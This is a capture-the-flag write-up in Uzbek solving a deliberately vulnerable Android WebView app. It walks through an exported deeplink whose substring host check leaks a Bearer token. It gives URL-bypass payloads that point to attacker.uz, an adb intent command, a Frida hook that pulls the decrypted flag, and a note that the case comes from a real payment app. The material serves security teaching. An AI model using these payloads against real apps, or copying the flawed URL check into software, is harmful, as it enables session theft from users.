## Solution 1 - Intended way

Kodni boshidan boshlasak, Android app SAST (statik tahlil)da birinchi Manifest ko'riladi:

### Manifest nima? - Manifest.xml android app haqida hamma configuration ma'lumotlarni saqlaydi, nomi nima, IDsi nima, versiyasi qanaqa, Activity, Receiver, Service, Provider, etc nomlari shu yerda saqlanadi, ular o'zini qanaqa tushishi shu yerda sozlanadi.
### Reverse Engineering qilinganda Manifest.xml ni qayerdan topamiz? - asosiy folderda turadi, topish oson.

```
    <activity>
        android:name=".MainActivity" // Asosiy activity nomi
        android:exported="true"> <intent-filter> // exported=true
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" /> 
    </intent-filter>

        <intent-filter>
            <action android:name="android.intent.action.VIEW" /> // intent create qilinyapti, vulnapp://load bilan launch qilsa bo'ladi
            <category android:name="android.intent.category.DEFAULT" />
            <category android:name="android.intent.category.BROWSABLE" />
            <data android:scheme="vulnapp" android:host="load" />
        </intent-filter>
    </activity>
```
### Deeplink nima? - Deeplink bu link, ya'ni oddiy havola faqat vebsayt uchun emas, Android app uchun, deeplink bosilganda qaysidur appni ichiga olib kiradi, appni qaysidur qismiga aynan o'ziga emas, oddiy linkga o'xshab Deeplinkda ham parametr kiritsa bo'ladi.
Bizda MainActivity bor halos exported qilingan, keyin deeplink bor: vulnapp://load, bu degani MainActivity hamma boshqa applardan tomondan foydalanilsa bo'ladi, bu yangilikmas deyarli hamma appda shunaqa, lekin deeplink qiziq, buni note qilib yozib turamiz hozricha.

```
        webView = findViewById(R.id.webView);
        WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webView.setWebViewClient(new WebViewClient());


        String[] parts = getResources().getStringArray(R.array.HByubYUByubUg67);
        String expectedScheme = parts[0];
        String expectedHost   = parts[1];

        Uri data = getIntent().getData();
        if (data != null
                && expectedScheme.equals(data.getScheme())
                && expectedHost.equals(data.getHost())) {

            String urlToLoad = data.getQueryParameter("url");
```

MainActivity.java da WebView implement qilinyapti, setJavaScriptEnabled orqali JavaScript kod executionga ruxsat berilyapti, keyin datani pass qilganda arrays.xml ichidan 2 string olyapti:

```
    <string-array name="HByubYUByubUg67">
        <item>vulnapp</item>
        <item>load</item>
    </string-array>
```

Bu degani activity call qilinganda data kutadi parametrda, data vulnapp://load?url= ko'rinishida bo'lishi kerak:
```
String urlToLoad = data.getQueryParameter("url"); \\ URL parameter parse qilish
```

**Zaiflik bor kod shu yerda joylashgan, app faqat shaptoli.uz saytini ochishga moslashgan, saytga esa Bearer token jo'natadi:**
**Bu case haqiqiy to'lov dasturidan olingan, zaiflik orqali boshqalarga link jo'natib, dasturni ishga tushirib dasturdan foydalanuvchi sessiyasini o'g'irlash iloji bo'lgan**

```
  if (urlToLoad != null && !urlToLoad.isEmpty()) { // URL parametrdagi havola null bo'lmasligi kerak
                Log.d(TAG, "URL: " + urlToLoad); // logcatda chiqaradi olgani havolani
                if (urlToLoad.contains("shaptoli.uz")) { \\ URL=url da shaptoli.uz string bormi tekshiradi
                    Log.i(TAG, "URL check passed (vulnerable). Loading: " + urlToLoad); // agar URL=<shu yerda> shaptoli.uz string bo'lsa checkdan o'tadi masalan http://shaptoli.uz.attacker.uz
                    Toast.makeText(this, "Loading URL (check passed): " + urlToLoad, Toast.LENGTH_LONG).show(); // Appda pop up "Check passed"
                    String bearerTokenPayload = _get_payload_data(); // Flagni decrypt qiladigan funksiyani chaqiryapti, shu yerda Dynamic RE qilib flagni extract qilsa bo'ladi Frida bilan
                    Map<String, String> headers = new HashMap<>();
                    headers.put("Authorization", "Bearer " + bearerTokenPayload); // Authorization headerda flagni base64 qilib jo'natadi
                    headers.put("X-Custom-Header", "VulnerableAppTest");
                    webView.loadUrl(urlToLoad, headers); // Linkni ochish
                } else {
                    Log.w(TAG, "URL check failed. URL does not contain 'shaptoli.uz': " + urlToLoad); // agar shaptoli.uz string URL ichida bo'lmasa error beradi.
                    Toast.makeText(this, "URL check failed. Must contain 'shaptoli.uz'", Toast.LENGTH_LONG).show();
                    webView.loadData(
                            "<html><body><h1>Error: Invalid URL.</h1><p>The URL must contain 'shaptoli.uz'.</p></body></html>",
                            "text/html", "UTF-8"
                    );
                }
```

Hammasi aniq, schema: vulnapp, host: load, parametr: url:
```vulnapp://load?url=shaptoli.uz```

Lekin bizda security check bor, URL ichida shaptoli.uz string bo'lishi kerak, buyog'i oddiy Bug bounty tricks & tips dan:

```
vulnapp://load?url=attacker.uz/shaptoli.uz
vulnapp://load?url=shaptoli.uz.attacker.uz
vulnapp://load?url=shaptoli.uz@attacker.uz
```
Bizda exploit qilish uchun payload bor, endi uni jo'natish kerak, birinchi yo'li ADB orqali invoke qilish:

``` adb shell am start -W -a android.intent.action.VIEW -d "vulnapp://load?url=attacker.uz/shaptoli.uz" com.example.vulnerablewebview```

Ikkinchi yo'li shunchaki shu havolani ustiga bosish, yuqorida aytilganidek deeplink bu link, ustiga bosish yetarli va shu yo'li intended wayga eng yaqini, sababi haqiqiy hujumda victimga shu havola jo'natiladi va uni sessiyasi bizga keladi, ADB kamandani hujumda ishlatish hujumni uzaytiradi:
```vulnapp://load?url=attacker.uz/shaptoli.uz```

Lekin aytaylik, bizda deeplink yo'q, lekin WebView Activity biz bergan linkni olib rostdan sessiya token jo'natadi, unda yangi APK yoziladi, APK WebView activityni narigi vulnerable dasturda ishga tushiradi va biz bergan linkni parametr sifatida beradi, bu juda uzun yo'li. O'xshashi uchun WebView activity exported="True" ya'ni, boshqa dastur tomonidan ishga tushirila olinishi kerak.

## Solution 2 - Dynamic Reverse Engineering

_get_payload_data() funskiyada ecrypt qilingan Flag dencrypt qilinishini ko'rsak bo'ladi:

### strings.xml, arrays.xml yoki R.array.etc qayerdan kelyabdi? - vebsayt yozyotganda ko'pchilik Environment variablesni .env ichida saqlaydi, keyinchalik .env fayl ichidagi login, parollarni kod ichidan turib chaqiradi, Android appda ham shunga yaqin narsa bor, string, array, boshqa resurslarni /res folderda saqlashimiz mumkin:
```
strings.xml:
<resources>
    <string name="app_name">shaptoli</string>
    <string name="RDgerewR34TS">GSwBND4eJWAHFRtWAxNQERQDDF9tQRAqEWRKLwlCPxg=</string>
    <string name="egwgweDdewgfewf">TXlTdXBlcg==</string>
    <string name="SysCall_Num">5365637265744C6162</string>
</resources>
```
Bu yerdan turib oddiy R.string.app_name deb bizga kerakli strigni chaqiraveramiz, Shaptoli ichida ham XOR key uchga bo'lingan va alohida strings.xml ichida saqlangan

```
    private String _get_payload_data() {
        try {
            String enc = getString(R.string.RDgerewR34TS); // XOR key 1-part

            byte[] p1 = Base64.decode(getString(R.string.egwgweDdewgfewf), Base64.DEFAULT);
            String part1 = new String(p1, StandardCharsets.UTF_8); // MySuper

            String hex = getString(R.string.SysCall_Num); // XOR key 2-part
            byte[] p2 = new byte[hex.length() / 2];
            for (int i = 0; i < hex.length(); i += 2) {
                p2[i / 2] = (byte) Integer.parseInt(hex.substring(i, i + 2), 16);
            }
            String part2 = new String(p2, StandardCharsets.UTF_8); // SecretLab

            int[] ints = getResources().getIntArray(R.array.Random_brute_numbers); // XOR key 3-part
            StringBuilder sb = new StringBuilder();
            for (int v : ints) sb.append((char) v);
            String part3 = sb.toString(); // Key123!

            byte[] keyBytes = (part1 + part2 + part3).getBytes(StandardCharsets.UTF_8); // 3ta key birlashtirilyapti
            byte[] data = Base64.decode(enc, Base64.DEFAULT); // FLAG base64 dan decode qilinadi
            byte[] flagBytes = _xor_op(data, keyBytes); // Loop bilan shu yerda XOR dan decryption qilinadi o'zini holatiga
            return Base64.encodeToString(flagBytes, Base64.NO_WRAP); // Decrypt qilingan FLAG base64 qilinadi yana serverga yuborilgani
        } catch (Exception e) {
            Log.e(TAG, "Error in _get_payload_data", e);
            return "ERROR_GENERATING_TOKEN";
        }
    }
```

Hullas _get_payload_data() flagni XOR key orqali decrypt qiladi, biz Dynamic Reverse Engineering orqali App ishlayotgan (runtime) paytida flagni xotiradan olsak bo'ladi decrypt qilingan holatida.

```
// MainActivity o'zini hook qilish iloji bo'lmadi, sababi MainActivity app spawn bo'lganda ishga tushib bo'ladi, shunga uni ichidagi OnCreate() hook qilinadi
Java.perform(function () {
    console.log("[+] MainActivity.onCreate hook qilinyapti..");

    var MainActivityClass = Java.use('com.example.vulnerablewebview.MainActivity');
    var Base64Class = Java.use('android.util.Base64');
    var StringClass = Java.use('java.lang.String');

    MainActivityClass.onCreate.implementation = function (savedInstanceState) { // OnCreate hook qilinadi (ilib olish)
        console.log("[+] MainActivity.onCreate() ushlandi!");

        this.onCreate(savedInstanceState);
        console.log("   [+] MainActivity.onCreate() ishga tushirildi.");

        var activityInstance = this;

        try {
            console.log("   [+] _get_payload_data() invoke qilinyapti...");
            var base64EncodedFlag = activityInstance._get_payload_data(); // invoke qilish _get_payload_data()

            if (typeof base64EncodedFlag !== 'string') {
                console.error("   [-] _get_payload_data() xatolik, string emas. type: " + typeof base64EncodedFlag + ", output:" + base64EncodedFlag);
                return;
            }
            console.log("   [+]  _get_payload_data() dan olingan output: " + base64EncodedFlag);

            if (base64EncodedFlag === "ERROR_GENERATING_TOKEN") {
                console.warn("   [-] _get_payload_data() xatolik: 'ERROR_GENERATING_TOKEN'. Flag olishda xato.");
                return;
            }

            console.log("   [+] Flag decode qilinyapti...");
            var decodedFlagBytes = Base64Class.decode(base64EncodedFlag, Base64Class.NO_WRAP.value); // Flag base64 da Bearerga jo'natiladi, script bizga base64 Flagni decode qilib beradi.

            console.log("   [+] UTF to'g'rilanyapti...");
            var flag = StringClass.$new(decodedFlagBytes, "UTF-8");

            console.log("\n [+] Flag: " + flag + "\n");

        } catch (e) {
            console.error("   [-] Xatolik :");
            console.error("       message: " + e.message);
            console.error("       stack: " + e.stack);
        }
    };

    console.log("[+] MainActivity.onCreate hook tayyor..");
});
```
Dastur Flagni decrypt qilgani uchun Decrypt qilingan flagni xotiradan olishimiz mumkin, agar Flag umuman decrypt qilinmaganda biz flagni to'gridan-to'g'ri olishimiz noto'g'ri yo'l bo'lardi.

Bu scriptni frida orqali ishga tushiramiz:
```
frida -U -f com.example.vulnerablewebview -l hook.js
```
![image](https://github.com/user-attachments/assets/e35822c2-78df-46e3-800f-70ee1218d5de)

Dynamic Reverse Engineering qilib flagni olishdan ma'no yo'q, hujum link jo'natishdan boshlanadi, lekin bu judayam qiziq mavzu. Biz ishlatadigan Root check, SSL pinning bypass frida scriptlar aslida shunaqa ishlaydi. Masalan, Root check qiladigan Class yoki Method ```isrooted:"true"``` qaytarsa, biz uni ```isrooted:"false"``` qilib o'zgartira olamiz. Bu usulni ko'rsatishdan maqsad fridadan foydalanishni yaxshiroq tushuntirish. Aslida dengizdan tomchi desak bo'ladi, haqiqiy dasturda SSL pinning qiladigan Classni nomini topish kerak 10,000 ga yaqin Class topiladi, kod analiz qilinadi, frida-trace yoki boshqa dasturlar bilan ishlanadi.

## Boshqa solutionlar

1) Biz agar 1-solutionda shaptoli.uz checkni bypass qilolmasak dastur requestni cleartext sifatida jo'natadi shaptoli.uz saytiga, requestni ushlab olib Headerdan flagni olsak bo'ladi
2) Xor key dastur ichida joylashgani uchun flagni o'zimiz decrypt qila olamiz.
